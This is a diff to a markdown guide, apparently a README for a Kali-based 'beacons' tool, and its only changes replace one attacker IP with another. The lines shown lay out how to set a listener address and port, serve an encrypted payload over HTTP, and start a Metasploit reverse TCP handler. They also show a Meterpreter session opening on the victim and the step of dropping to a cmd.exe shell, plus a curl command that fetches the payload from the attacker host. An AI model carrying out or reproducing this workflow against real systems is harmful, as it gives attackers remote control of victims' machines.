@@ -34,7 +34,7 @@ cd /home/yenn/Desktop/beacons
 
 **Prompts:**
 ```
-Enter your Kali IP (LHOST) [192.168.1.56]: <YOUR_IP>
+Enter your Kali IP (LHOST) [10.10.10.100]: <YOUR_IP>
 Enter listener port (LPORT) [4444]: <YOUR_PORT>
 Enter HTTP server port [8080]: <HTTP_PORT>
 Continue with this configuration? (y/n): y
@@ -60,7 +60,7 @@ Scripts created
 **Output:**
 ```
 [*] Starting HTTP server on port 8080...
-[*] Payload URL: http://192.168.1.56:8080/payload.enc
+[*] Payload URL: http://10.10.10.100:8080/payload.enc
 [+] Server is running. Press CTRL+C to stop.
 ```
 
@@ -78,8 +78,8 @@ Scripts created
 **Output:**
 ```
 [*] Starting Metasploit handler...
-[*] Listening on: 192.168.1.56:4444
-[*] Started reverse TCP handler on 192.168.1.56:4444
+[*] Listening on: 10.10.10.100:4444
+[*] Started reverse TCP handler on 10.10.10.100:4444
 ```
 
 **Leave this running!**
@@ -94,7 +94,7 @@ Scripts created
 
 **In Metasploit console, you'll see:**
 ```
-[*] Meterpreter session 1 opened (192.168.1.56:4444 -> 192.168.1.X:XXXXX)
+[*] Meterpreter session 1 opened (10.10.10.100:4444 -> 192.168.1.X:XXXXX)
 ```
 
 ---
@@ -133,7 +133,7 @@ meterpreter > shell     # Get cmd.exe shell
 **No connection?**
 ```bash
 # Check server is running
-curl http://192.168.1.56:8080/payload.enc
+curl http://10.10.10.100:8080/payload.enc
 
 # Check listener
 # In Metasploit: jobs -l
